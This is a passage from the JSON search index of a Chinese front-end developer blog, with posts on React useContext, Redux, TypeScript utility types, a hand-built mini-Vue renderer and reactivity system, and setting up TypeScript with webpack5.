接收一个context对象（React.createContext的返回值）并返回该context的当前值，当前的context值由上层㢟中距离当前组件最近的&lt;MyContext.Provider&gt;的value prop角色 当组件上层最近的&lt;MyContext.Provider&gt;更新时，该Hook会触发重渲染，使用最新传递给MyContext provider的context value值。 useContext(MyContext)相当于static contextType=MyContext或者&lt;MyContext.Consumer&gt; useContext(MyContext) 只是让你能够读取 context 的值以及订阅 context 的变化。你仍然需要在上层组件树中使用 &lt;MyContext.Provider&gt; 来为下层组件提供 context。","categories":[{"name":"React","slug":"React","permalink":"https://coloey.github.io/categories/React/"}],"tags":[]},{"title":"redux","slug":"redux","date":"2022-07-26T15:48:24.000Z","updated":"2022-07-26T16:30:29.755Z","comments":true,"path":"2022/07/26/redux/","link":"","permalink":"https://coloey.github.io/2022/07/26/redux/","excerpt":"","text":"概念：Redux 是一个使用”actions”的事件管理和更新应用状态的模式和工具库,以集中式Store的方式对整个应用中使用的状态进行集中管理，其规则确保状态只能以可预测的方式更新 Redux 在以下情况下更有用： 在应用的大量地方，都存在大量的状态 应用状态会随着时间的推移而频繁更新 更新该状态的逻辑可能很复杂 中型和大型代码量的应用，很多人协同开发 store:保存应用程序的全局state的容器，是一个Js对象，store是通过传入一个reducer来创建的，并且有一个名为getState的方法，它返回当前状态值 1234import &#123;configureStore&#125; from &quot;@reduxjs/toolkit&quot;const store=configureStore(&#123;reducer:counterReducer&#125;)console.log(store.getState())//&#123;value:0&#125; action:是一个具有type字段的普通js对象，可以将action视为描述应用程序中发生了什么事件，type字段是一个字符串，给这个action一个描述性的名字，比如”todos/todoAdded”(域/事件名称)，第一部分是这个action所属的特征和类别，第二部分是具体发生的具体事情 action对象可以有其他字段，将其放在名为payload的字段中 action创建函数：就是生成action的方法，action创建函数只是简单返回一个action 123456function addTodo(text) &#123; return &#123; type: ADD_TODO, text &#125;&#125; reducersreducer是一个函数，接收当前的state和一个action对象，必要时决定如何更新状态，并返回新状态，函数签名(state,action)=&gt;newState,可以将reducer视为一个事件监听器，它根据接收到的action类型处理事件 reducer必须是一个纯函数： 仅使用 state 和 action 参数计算新的状态值 禁止直接修改 state。必须通过复制现有的 state 并对复制的值进行更改的方式来做 不可变更新（immutable updates）。 禁止任何异步逻辑、依赖随机值或导致其他“副作用”的代码 reducer 函数内部的逻辑通常遵循以下步骤： 检查 reducer 是否关心这个 action 如果是，则复制 state，使用新值更新 state 副本，然后返回新 state 否则，返回原来的 state 不变 dispatch更新state的唯一方法是调用store.dispatch()并传入一个action对象，store将执行所有reducer函数并计算出更新后的state,调用getState()可以获取更新的state 123store.dispatch(&#123;type:&#x27;counter/increamented&#x27;&#125;)console.log(store.getStore())//&#123;value:1&#125; Selectors:Selector函数可以从store状态树中提取指定的片段，随着应用变大，遇到不同应用程序的不同部分需要读取相同数据，selector可以避免重复这样的状态逻辑 1234const selectCounterValue=state=&gt;state.valueconst currentValue = selectCounterValue(store.getState())console.log(currentValue)//2 核心概念：单一数据源：应用程序的全局状态作为对象存储在单个 store 中。任何给定的数据片段都应仅存在于一个位置，而不是在许多位置重复。 state只读： 更改状态的唯一方法是 dispatch 一个 action，这是一个描述所发生情况的对象。 这样，UI 就不会意外覆盖数据，并且更容易跟踪发生状态更新的原因。由于 actions 是普通的 JS 对象，因此可以记录、序列化、存储这些操作，并在以后重放这些操作以进行调试或测试。 使用reducer纯函数进行更改： Reducers 是纯函数，它们采用旧 state 和 action，并返回新 state。 redux数据流：单向数据流： root reducer函数创建Redux store=&gt;store调用一次root reducer,并将返回值保存为它的初始state=&gt;UI首次渲染时，UI组件访问Redux store的当前state,并将数据渲染为内容，监听store的更新： 应用更新=&gt;dispatch一个action到Redux store=&gt;store用之前的state和当前的action再次运行reducer函数，并将返回值保存为新的state=&gt;store通知所有订阅过的UI,通知store更新=&gt;每个订阅过store数据的UI组件就会检查它们需要的state部分是否被更新=&gt;发现更新，每个组件强制使用新数据渲染，更新网页 明确两个概念：UI组件：不能使用任何redux的api,只负责页面的呈现，交互 容器组件：负责和redux通信，将结果交给UI组件 创建一个容器组件：靠react-redux的connect函数，connect(mapStateToProps,mapDispatchToProps)(UI组件) mapStateToProps:映射状态：返回值时一个对象 mapDispatchToProps:映射操作状态的方法，返回值是一个对象 123456789101112131415161718192021222324252627282930313233343536import &#123; connect &#125; from &#x27;react-redux&#x27;import &#123; toggleTodo &#125; from &#x27;../actions&#x27;import TodoList from &#x27;../components/TodoList&#x27;const getVisibleTodos = (todos, filter) =&gt; &#123; switch (filter) &#123; case &#x27;SHOW_COMPLETED&#x27;: return todos.filter(t =&gt; t.completed) case &#x27;SHOW_ACTIVE&#x27;: return todos.filter(t =&gt; !t.completed) case &#x27;SHOW_ALL&#x27;: default: return todos &#125;&#125;const mapStateToProps = state =&gt; &#123; return &#123; todos: getVisibleTodos(state.todos, state.visibilityFilter) &#125;&#125;const mapDispatchToProps = dispatch =&gt; &#123; return &#123; onTodoClick: id =&gt; &#123; dispatch(toggleTodo(id)) &#125; &#125;&#125;const VisibleTodoList = connect( mapStateToProps, mapDispatchToProps)(TodoList)export default VisibleTodoList 容器组件中的store是靠props传进去，而不是在容器组件中直接引入 优化： 容器组件和UI组件整合为一个文件 不用给容器组件传递store,给包裹一个即可 使用react-redux后不用自己检测redux状态的变化，容器组件自己完成这个工作 mapDispatchToProps写成一个对象 123&#123; onTodoClick:toggleTodo&#125; 总结：一个组件与redux打交道步骤： 定义UI组件不暴露 引入connect生成一个容器组件：connect(state=&gt;{key:value}),{key:xxxAction})(UI组件) 在UI组件中通过this.props.xxx读取和操作状态 todoList例子： https://www.redux.org.cn/docs/basics/ExampleTodoList.html","categories":[{"name":"React","slug":"React","permalink":"https://coloey.github.io/categories/React/"}],"tags":[]},{"title":"实用程序类型","slug":"实用程序类型","date":"2022-07-25T07:39:45.000Z","updated":"2022-07-25T08:08:01.676Z","comments":true,"path":"2022/07/25/实用程序类型/","link":"","permalink":"https://coloey.github.io/2022/07/25/%E5%AE%9E%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"Partial构造一个所有属性的Type都设置为可选的类型，返回一个表示给定类型的所有子集的类型 123456789101112131415interface Todo &#123; title:string; description:stirng;&#125;function updateTodo(todo:Todo,fieldsToUpdate:Partial&lt;Todo&gt;)&#123; return &#123;...todo,...fieldsToUpdate&#125;&#125;const todo1 = &#123; title: &quot;organize desk&quot;, description: &quot;clear clutter&quot;,&#125;; const todo2 = updateTodo(todo1, &#123; description: &quot;throw out trash&quot;,&#125;); Required构造一个由所有属性类型都是required的类型，与Partial相反 123456789interface Props &#123; a?: number; b?: string;&#125; const obj: Props = &#123; a: 5 &#125;; const obj2: Required&lt;Props&gt; = &#123; a: 5 &#125;;//Property &#x27;b&#x27; is missing in type &#x27;&#123; a: number; &#125;&#x27; but required in type &#x27;Required&lt;Props&gt;&#x27;. Readonly构造一个所有属性的Type都设置为readonly的类型，这意味着构造类型的属性不能重新分配 12345678910interface Todo &#123; title: string;&#125; const todo: Readonly&lt;Todo&gt; = &#123; title: &quot;Delete inactive users&quot;,&#125;; todo.title = &quot;Hello&quot;;//Cannot assign to &#x27;title&#x27; because it is a read-only property. Record&lt;Keys,Type&gt;构造一个对象类型，其属性键为keys，属性值为Type,可用于将一种类型的属性映射到另一种类型 12345678910111213141516interface CatInfo &#123; age: number; breed: string;&#125; type CatName = &quot;miffy&quot; | &quot;boris&quot; | &quot;mordred&quot;; const cats: Record&lt;CatName, CatInfo&gt; = &#123; miffy: &#123; age: 10, breed: &quot;Persian&quot; &#125;, boris: &#123; age: 5, breed: &quot;Maine Coon&quot; &#125;, mordred: &#123; age: 16, breed: &quot;British Shorthair&quot; &#125;,&#125;; cats.boris; //const cats: Record&lt;CatName, CatInfo Pick&lt;Type,Keys&gt;通过从中选择一组属性keys来构造类型Type 12345678910111213141516interface Todo &#123; title: string; description: string; completed: boolean;&#125; type TodoPreview = Pick&lt;Todo, &quot;title&quot; | &quot;completed&quot;&gt;; const todo: TodoPreview = &#123; title: &quot;Clean room&quot;, completed: false,&#125;; todo; //const todo: TodoPreview omit&lt;Type,Keys&gt;Type通过从中选择所有属性然后删除keys来构造类型 1234567891011121314151617181920212223242526272829interface Todo &#123; title: string; description: string; completed: boolean; createdAt: number;&#125; type TodoPreview = Omit&lt;Todo, &quot;description&quot;&gt;; const todo: TodoPreview = &#123; title: &quot;Clean room&quot;, completed: false, createdAt: 1615544252770,&#125;; todo; //const todo: TodoPreview type TodoInfo = Omit&lt;Todo, &quot;completed&quot; | &quot;createdAt&quot;&gt;; const todoInfo: TodoInfo = &#123; title: &quot;Pick up kids&quot;, description: &quot;Kindergarten closes at 5pm&quot;,&#125;; todoInfo; //const todoInfo: TodoInfo Exclude&lt;UnionType,ExcludedMembers&gt;通过从UnionType中排除可以赋值给ExcludedMembers的值 1234567type T0=Exclude&lt;&quot;a&quot;|&quot;b&quot;|&quot;c&quot;,&quot;a&quot;&gt;//type T0=&quot;b&quot;|&quot;c&quot;type T1=Exclude&lt;&quot;a&quot;|&quot;b&quot;|&quot;c&quot;,&quot;a&quot;|&quot;b&quot;&gt;;//type T1=&quot;c&quot;type T2 = Exclude&lt;string | number | (() =&gt; void), Function&gt;; //type T2 = string | number Extract&lt;Type,Union&gt;提取出Type和Union的交集（可以赋值给Union成员的值） 123456type T0 = Extract&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;a&quot; | &quot;f&quot;&gt;; //type T0 = &quot;a&quot;type T1 = Extract&lt;string | number | (() =&gt; void), Function&gt;; //type T1 = () =&gt; void NonNullable构造一个类型，可以从Type中排除null和undefined 123456type T0 = NonNullable&lt;string | number | undefined&gt;; //type T0 = string | numbertype T1 = NonNullable&lt;string[] | null | undefined&gt;; //type T1 = string[] ReturnType由函数返回类型组成（Type必须是一个（…args:any）=&gt;any) 1234567891011121314151617181920212223242526272829303132333435declare function f1(): &#123; a: number; b: string &#125;; type T0 = ReturnType&lt;() =&gt; string&gt;; //type T0 = stringtype T1 = ReturnType&lt;(s: string) =&gt; void&gt;; //type T1 = voidtype T2 = ReturnType&lt;&lt;T&gt;() =&gt; T&gt;; //type T2 = unknowntype T3 = ReturnType&lt;&lt;T extends U, U extends number[]&gt;() =&gt; T&gt;; //type T3 = number[]type T4 = ReturnType&lt;typeof f1&gt;; //type T4 = &#123; // a: number; // b: string;//&#125;type T5 = ReturnType&lt;any&gt;; //type T5 = anytype T6 = ReturnType&lt;never&gt;; //type T6 = nevertype T7 = ReturnType&lt;string&gt;;//Type &#x27;string&#x27; does not satisfy the constraint &#x27;(...args: any) =&gt; any&#x27;. //type T7 = anytype T8 = ReturnType&lt;Function&gt;;//Type &#x27;Function&#x27; does not satisfy the constraint &#x27;(...args: any) =&gt; any&#x27;.// Type &#x27;Function&#x27; provides no match for the signature &#x27;(...args: any): any&#x27;. //type T8 = any 官网链接：https://www.typescriptlang.org/docs/handbook/utility-types.html#returntypetype","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"纯函数","slug":"纯函数","date":"2022-07-23T08:15:51.000Z","updated":"2022-07-23T08:15:51.587Z","comments":true,"path":"2022/07/23/纯函数/","link":"","permalink":"https://coloey.github.io/2022/07/23/%E7%BA%AF%E5%87%BD%E6%95%B0/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"IOC原理","slug":"IOC原理","date":"2022-07-17T09:04:33.000Z","updated":"2022-07-17T09:04:34.165Z","comments":true,"path":"2022/07/17/IOC原理/","link":"","permalink":"https://coloey.github.io/2022/07/17/IOC%E5%8E%9F%E7%90%86/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"mini-vue","slug":"mini-vue","date":"2022-07-10T08:26:42.000Z","updated":"2022-07-10T08:54:15.531Z","comments":true,"path":"2022/07/10/mini-vue/","link":"","permalink":"https://coloey.github.io/2022/07/10/mini-vue/","excerpt":"","text":"虚拟结点+diff算法部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106function h(tag,props,children)&#123; return &#123; tag, props, children &#125;&#125;function mount(vnode,container)&#123; //创建相应的真实DOM结点 const el=vnode.el=document.createElement(vnode.tag); //props if(vnode.props)&#123; for(const key in vnode.props)&#123; const value=vnode.props[key]; el.setAttribute(key,value); &#125; &#125; //children if(vnode.children)&#123; if(typeof vnode.children==&#x27;string&#x27;)&#123; el.textContent=vnode.children; &#125; else&#123; vnode.children.forEach(child=&gt;&#123; mount(child,el)//递归 &#125;) &#125; &#125; container.appendChild(el);&#125;const vdom=h(&#x27;div&#x27;,&#123;class:&#x27;red&#x27;&#125;,[ h(&#x27;span&#x27;,null,[&#x27;hello&#x27;])])const vdom2=h(&#x27;div&#x27;,&#123;class:&#x27;red&#x27;&#125;,[ h(&#x27;span&#x27;,null,[&#x27;hi&#x27;])])mount(vdom,document.getElementById(&#x27;app&#x27;))function patch(n1,n2)&#123; const el=n2.el=n1.el; if(n1.tag===n2.tag)&#123; //props const oldProps=n1.props||&#123;&#125;; const newProps=n1.props||&#123;&#125;; for(const key in newProps)&#123; const oldValue=oldProps[key]; const newValue=newProps[key] if(newValue!==oldValue)&#123; el.setAttribute(key,newValue) &#125; &#125; for(const key in oldProps)&#123; if(!key in newProps)&#123; el.removeAttribute(key) &#125; &#125; //children const oldChildren=n1.children; const newChildren=n2.children; if(typeof newChildren===&#x27;string&#x27;)&#123; if(typeof oldChildren===&#x27;string&#x27;)&#123; if(newChildren!==oldChildren)&#123; el.textContent=newChildren; &#125; &#125;else&#123; el.textContent=newChildren &#125; &#125;else &#123; //if newChildren is array if(typeof oldChildren===&#x27;string&#x27;)&#123; el.innerHTML=&#x27;&#x27; newChildren.forEach(child=&gt;&#123; mount(child,el) &#125;) &#125;else&#123; const commonLength=Math.min(oldChildren.length,newChildren.length) for(let i=0;i&lt;commonLength;i++)&#123; patch(oldChildren[i],newChildren[i]) &#125; if(newChildren.length&gt;oldChildren.length)&#123; newChildren.slice(oldChildren.length).forEach(child=&gt;&#123; mount(child,el) &#125;) &#125;else if(newChildren.length&lt;oldChildren.length)&#123; oldChildren.slice(newChildren.length).forEach(child=&gt;&#123; el.removeChild(child.el); &#125;) &#125; &#125; &#125; &#125;else&#123; //replace &#125;&#125;patch(vdom,vdom2); reactive部分1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586let activeEffect;class Dep&#123; subscribers=new Set() depend()&#123; if(activeEffect)&#123; this.subscribers.add(activeEffect) &#125; &#125; notify()&#123; this.subscribers.forEach(effect=&gt;&#123; effect() &#125;) &#125;&#125;//Vue2/*function reactive(raw)&#123; Object.keys(raw).forEach(key=&gt;&#123; const dep=new Dep() let value=raw[key] Object.defineProperty(raw,key,&#123; get()&#123; dep.depend() return value &#125;, set(newValue)&#123; value=newValue dep.notify() &#125; &#125;) &#125;) return raw&#125;*/const targetMap=new WeakMap()//键值可以是对象，而且会被自动垃圾回收function getDep(target,key)&#123; let depsMap=targetMap.get(target) if(!depsMap)&#123; depsMap=new Map() targetMap.set(target,depsMap) &#125; let dep=depsMap.get(key) if(!dep)&#123; dep=new Dep() depsMap.set(key,dep) &#125; return dep;&#125;const reactiveHandler=&#123; get(target,key,receiver)&#123; let dep=getDep(target,key) dep.depend() return Reflect.get(target,key,receiver)//Reflect不会抛出异常，只会抛出真假 &#125;, set(target,key,value,receiver)&#123; let dep=getDep(target,key) const result=Reflect.set(target,key,value,receiver) dep.notify() return result &#125; &#125;function reactive(raw)&#123; return new Proxy(raw,reactiveHandler)//Proxy 会触发set get 有利于数组观测，不必多写一些数组内置方法&#125;function watchEffect(effect)&#123; activeEffect=effect effect() activeEffect=null&#125;const dep=new Dep()const state=reactive(&#123; count:0&#125;)watchEffect(()=&gt;&#123; console.log(state.count)&#125;)//effect runstate.count++; 完整mini-vue123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;script&gt; function h(tag,props,children)&#123; return &#123; tag, props, children &#125;&#125;function mount(vnode,container)&#123; //创建相应的真实DOM结点 const el=vnode.el=document.createElement(vnode.tag); //props if(vnode.props)&#123; for(const key in vnode.props)&#123; const value=vnode.props[key]; if(key.startsWith(&#x27;on&#x27;))&#123; el.addEventListener(key.slice(2).toLowerCase(),value)//事件机制 &#125;else&#123; el.setAttribute(key,value); &#125; &#125; &#125; //children if(vnode.children)&#123; if(typeof vnode.children===&#x27;string&#x27;)&#123; el.textContent=vnode.children; &#125; else&#123; vnode.children.forEach(child=&gt;&#123; mount(child,el)//递归 &#125;) &#125; &#125; container.appendChild(el);&#125;function patch(n1,n2)&#123; const el=n2.el=n1.el; if(n1.tag===n2.tag)&#123; //props const oldProps=n1.props||&#123;&#125;; const newProps=n1.props||&#123;&#125;; for(const key in newProps)&#123; const oldValue=oldProps[key]; const newValue=newProps[key] if(newValue!==oldValue)&#123; el.setAttribute(key,newValue) &#125; &#125; for(const key in oldProps)&#123; if(!key in newProps)&#123; el.removeAttribute(key) &#125; &#125; //children const oldChildren=n1.children; const newChildren=n2.children; if(typeof newChildren===&#x27;string&#x27;)&#123; if(typeof oldChildren===&#x27;string&#x27;)&#123; if(newChildren!==oldChildren)&#123; el.textContent=newChildren; &#125; &#125;else&#123; el.textContent=newChildren &#125; &#125;else &#123; //if newChildren is not string if(typeof oldChildren===&#x27;string&#x27;)&#123; el.innerHTML=&#x27;&#x27; newChildren.forEach(child=&gt;&#123; mount(child,el) &#125;) &#125;else&#123; const commonLength=Math.min(oldChildren.length,newChildren.length) for(let i=0;i&lt;commonLength;i++)&#123; patch(oldChildren[i],newChildren[i]) &#125; if(newChildren.length&gt;oldChildren.length)&#123; newChildren.slice(oldChildren.length).forEach(child=&gt;&#123; mount(child,el) &#125;) &#125;else if(newChildren.length&lt;oldChildren.length)&#123; oldChildren.slice(newChildren.length).forEach(child=&gt;&#123; el.removeChild(child.el); &#125;) &#125; &#125; &#125; &#125;else&#123; //replace &#125;&#125; let activeEffect;class Dep&#123; subscribers=new Set() depend()&#123; if(activeEffect)&#123; this.subscribers.add(activeEffect) &#125; &#125; notify()&#123; this.subscribers.forEach(effect=&gt;&#123; effect() &#125;) &#125;&#125;const targetMap=new WeakMap()//只接受键值是对象，不接受其他类型的值作为键值，本身不可以从任何代码访问，而且会被自动垃圾回收，不可以迭代function getDep(target,key)&#123; let depsMap=targetMap.get(target) if(!depsMap)&#123; depsMap=new Map()//可以迭代键 targetMap.set(target,depsMap) &#125; let dep=depsMap.get(key) if(!dep)&#123; dep=new Dep() depsMap.set(key,dep) &#125; return dep;&#125;const reactiveHandler=&#123; get(target,key,receiver)&#123; let dep=getDep(target,key) dep.depend() return Reflect.get(target,key,receiver)//Reflect不会抛出异常，只会抛出真假 &#125;, set(target,key,value,receiver)&#123; let dep=getDep(target,key) const result=Reflect.set(target,key,value,receiver) dep.notify() return result &#125; &#125;function reactive(raw)&#123; return new Proxy(raw,reactiveHandler)//Proxy 会触发set get 有利于数组观测，不必多写一些数组内置方法&#125;function watchEffect(effect)&#123; activeEffect=effect effect() activeEffect=null&#125;const dep=new Dep()const App=&#123; data:reactive(&#123; count:0 &#125;), render()&#123; return h(&#x27;div&#x27;,&#123; onClick:()=&gt;&#123; this.data.count++; &#125; &#125;, String(this.data.count)) &#125;&#125;function mountApp(component,container)&#123; let isMounted=false let prevVdom watchEffect(()=&gt;&#123; if(!isMounted)&#123; prevVdom=component.render() mount(prevVdom,container) isMounted=true &#125;else&#123; const newVdom=component.render() patch(prevVdom,newVdom) prevVdom=newVdom &#125; &#125;)&#125;mountApp(App,document.getElementById(&#x27;app&#x27;))&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"Vue3源码","slug":"Vue3源码","permalink":"https://coloey.github.io/categories/Vue3%E6%BA%90%E7%A0%81/"}],"tags":[{"name":"Deep dive with Evan You","slug":"Deep-dive-with-Evan-You","permalink":"https://coloey.github.io/tags/Deep-dive-with-Evan-You/"}]},{"title":"搭建TypeScript+webpack5开发环境","slug":"搭建TypeScript-webpack5开发环境","date":"2022-07-08T13:13:05.000Z","updated":"2022-07-08T13:56:17.405Z","comments":true,"path":"2022/07/08/搭建TypeScript-webpack5开发环境/","link":"","permalink":"https://coloey.github.io/2022/07/08/%E6%90%AD%E5%BB%BATypeScript-webpack5%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/","excerpt":"","text":"初始化package.json初始化package.json有两种方式，一种是通过npm管理，一种是通过yarn管理。 npm命令： 1npm init yarn命令： 1yarn init 直接用默认配置： 1yarn init -y package.json中dependencies,devDependencies,peerDependencies,scripts这几个字段的意思。 dependencies:生产环境，项目运行的依赖（如ract,ract-dom devDependencies开发环境，项目所需的依赖(webpack插件，打包插件叶索插件，eslint等) peerDependencies 包不会自动安装，会提示你项目运行，需要主动安装该依赖 scripts命令脚本 引入TypeScript1npm i -D typescript 或者 1yarn add typescript -D 用tsc命令初始化生产tsconfig.json文件1tsc --init tssconfig.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&#123; &quot;compilerOptions&quot;: &#123; &quot;rootDir&quot;: &quot;./src&quot;,//源码目录 &quot;target&quot;: &quot;es5&quot;, // 指定输出 ECMAScript 目标版本 &quot;module&quot;: &quot;ESNext&quot;, //面向未来的ESM模块化 &quot;strict&quot;: true, // 开启所有的严格检查配置 &quot;esModuleInterop&quot;: true, // 允许 export = xxx 导出 ，并使用 import xxx form &quot;module-name&quot; 导入 &quot;outDir&quot;: &quot;dist&quot;, /* 指定要包含在编译中的库文件——引用类库——即申明文件，如果输出的模块方式是 es5，就会默认引入 &quot;dom&quot;,&quot;es5&quot;,&quot;scripthost&quot; 。如果在 TS 中想要使用一些 ES6 以上版本的语法，就需要引入相关的类库 */ &quot;lib&quot;: [ &quot;webworker&quot;, &quot;dom&quot;, &quot;es5&quot;, &quot;es2015&quot;, &quot;es2016&quot;, &quot;es2015.promise&quot;, &quot;dom.iterable&quot;, &quot;scripthost&quot;, &quot;esnext&quot;, ], // 要包含在编译中的依赖库文件列表 &quot;allowJs&quot;: true, // 允许编译 JavaScript 文件 // 检查 JS 文件 &quot;checkJs&quot;: true, &quot;skipLibCheck&quot;: true, // 跳过所有声明文件的类型检查 &quot;allowSyntheticDefaultImports&quot;: true, // 允许从没有默认导出的模块进行默认导入 &quot;resolveJsonModule&quot;: true, // 允许使用 .json 扩展名导入的模块 /* react 模式下：直接将 JSX 编译成 JS，会生成 React.createElement 的形式，在使用前不需要再进行转换操作了，输出文件的扩展名为 .js */ /* preserve 模式下：不会将 JSX 编译成 JS，生成代码中会保留 JSX，以供后续的转换操作使用（比如：Babel）。 另外，输出文件会带有 .jsx 扩展名 */ /* react-native 模式下：相当于 preserve，它也保留了所有的 JSX，但是输出文件的扩展名是 .js */ &quot;jsx&quot;: &quot;react&quot;, // 在.tsx文件中支持JSX &quot;sourceMap&quot;: true, // 生成相应的.map文件 &quot;declaration&quot;: true, // 生成相应的.d.ts文件 &quot;allowUmdGlobalAccess&quot;: true, &quot;experimentalDecorators&quot;: true, // 启用对ES装饰器的实验性支持 &quot;moduleResolution&quot;: &quot;node&quot;, // 将模块解析模式设置为node.js解析模式 &quot;baseUrl&quot;: &quot;./&quot;, &quot;incremental&quot;: true, // 通过从以前的编译中读取/写入信息到磁盘上的文件来启用增量编译 &quot;forceConsistentCasingInFileNames&quot;: true, /* 当目标是ES5或ES3的时候提供对for-of、扩展运算符和解构赋值中对于迭代器的完整支持 */ &quot;downlevelIteration&quot;: true, &quot;noUnusedLocals&quot;: true, &quot;noUnusedParameters&quot;: true, &quot;noImplicitReturns&quot;: true, &quot;noFallthroughCasesInSwitch&quot;: true, // 不允许使用隐式的 any 类型 &quot;noImplicitAny&quot;: false, // 不允许 this 有隐式的 any 类型，即 this 必须有明确的指向 &quot;noImplicitThis&quot;: false, // 不允许把 null、undefined 赋值给其他类型变量 &quot;strictNullChecks&quot;: false, &quot;paths&quot;: &#123; //别名 &quot;@/*&quot;: [ &quot;src/*&quot; ], &quot;@images/*&quot;: [ &quot;src/assets/images/*&quot; ], &#125; &#125;, &quot;include&quot;: [ &quot;src&quot; ], &quot;exclude&quot;: [ &quot;node_modules&quot;, &quot;dist&quot; ] // *** 不进行类型检查的文件 ***&#125;作者：qyjandroid链接：https://juejin.cn/post/7020972849649156110来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 引入webpack1npm i webpack webpack-cli webpack-dev-server --save-dev 构建tsx关于TS转JS，有三种方案 tsc 缺点，转换为es5后，一些语法特性不能转换 ts-loader babel-loader+@babel/preset-typescript 插件丰富，后序兼容扩展性强 1npm i @babel/core @babel/preset-env babel-loader core-js [babel中文网](https://link.juejin.cn/?target=https%3A%2F%2Fwww.babeljs.cn%2Fdocs%2Fusage 安装必要的webapck插件和Loader 1npm i -D html-webpack-plugin less-loader css-loader style-loader postcss postcss-loader 配置webpack.config.js解释：path.resolve()方法用于将相对路径转为绝对路径 它接收多个参数，依次表示所要进入的路径，直到将最后一个参数转为绝对路径，如果根据参数无法得到绝对路径，就以当前所在路径作为基准，除了根目录，该方法的返回值不带尾部斜杠 例如： 12345// 格式path.resolve([from ...], to)// 实例path.resolve(&#x27;foo/bar&#x27;, &#x27;/tmp/file/&#x27;, &#x27;..&#x27;, &#x27;a/../subfile&#x27;) 执行效果： 12345$ cd foo/bar$ cd /tmp/file/$ cd ..$ cd a/../subfile$ pwd node.js中的文件路径大概有____dirname,___filename,precess.cwd,./或者../ 1234__dirname： 获得当前执行文件所在目录的完整目录名__filename： 获得当前执行文件的带有完整绝对路径的文件名process.cwd()：获得当前执行node命令时候的文件夹目录名 ./： 文件所在目录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const path=require(&#x27;path&#x27;)module.exports=&#123; entry:&#x27;./src/index.ts&#x27;, //用来设置引用模块,避免找不到ts和js模块 resolve: &#123; extensions:[&#x27;.ts&#x27;,&#x27;.js&#x27;] &#125;, output:&#123; path:path.resolve(__dirname,&#x27;dist&#x27;), //打包后文件 filename:&quot;bundle.js&quot;, clean:true, environment:&#123; arrowFunction: false,//关闭webpack的箭头函数，可选 &#125; &#125;, //开发模式使用，方便查错误 devtool:&#x27;inline-source-map&#x27;, devServer: &#123; static:&#x27;./dist&#x27;, &#125;, module:&#123; rules:[ &#123; test:/\\.ts$/, use: [ &#123; loader:&quot;babel-loader&quot;, //设置babel options:&#123; //设置预定义环境 presets:[ [ //指定环境的插件 &quot;@babel/preset-env&quot;, //配置信息 &#123; //要兼容的目标浏览器 targets:&#123; chrome:&quot;58&quot;, ie:&quot;11&quot;, &#125;, //指定corejs版本 corejs:&#x27;3&#x27;, //使用corejs的方式&quot;usage&quot;表示按需加载,能够解决ie11旧浏览器中promise无法使用的问题 useBuiltIns:&quot;usage&quot;, &#125; ] ] &#125; &#125;, &#123; loader:&#x27;ts-loader&#x27;, &#125;, ], exclude:/node-modules/ &#125;, &#123; test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, //引入postcss &#123; loader:&quot;postcss-loader&quot;, options:&#123; postcssOptions:&#123; plugins:[ [ &quot;postcss-preset-env&quot;, &#123; browsers:&#x27;last 2 versions&#x27; &#125; ] ] &#125; &#125; &#125;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125;, ] &#125;, plugins:[ new HtmlWebpackPlugin( &#123;template:&#x27;./src/index.html&#x27;&#125; ) ], mode:&#x27;development&#x27;&#125; 修改 package.json中scripts 1234&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;build&quot;: &quot;webpack-dev-server --open&quot; &#125;, 直接npm run build就能启动webpack-dev-server","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/tags/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}]},{"title":"装饰器","slug":"装饰器","date":"2022-07-07T07:06:45.000Z","updated":"2022-07-07T14:24:56.390Z","comments":true,"path":"2022/07/07/装饰器/","link":"","permalink":"https://coloey.github.io/2022/07/07/%E8%A3%85%E9%A5%B0%E5%99%A8/","excerpt":"","text":"装饰器_装饰器_是一种特殊类型的声明，它能够被附加到类声明，方法，访问符，属性或参数上。 